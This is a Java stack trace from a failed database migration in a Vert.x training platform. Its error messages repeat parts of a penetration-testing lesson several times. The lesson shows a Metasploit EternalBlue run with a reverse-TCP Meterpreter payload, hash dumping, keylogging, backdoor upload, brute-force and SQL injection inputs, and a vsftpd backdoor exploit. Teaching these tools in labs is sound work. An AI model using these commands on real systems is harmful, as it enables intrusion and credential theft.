	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:58:12.256 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:247)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
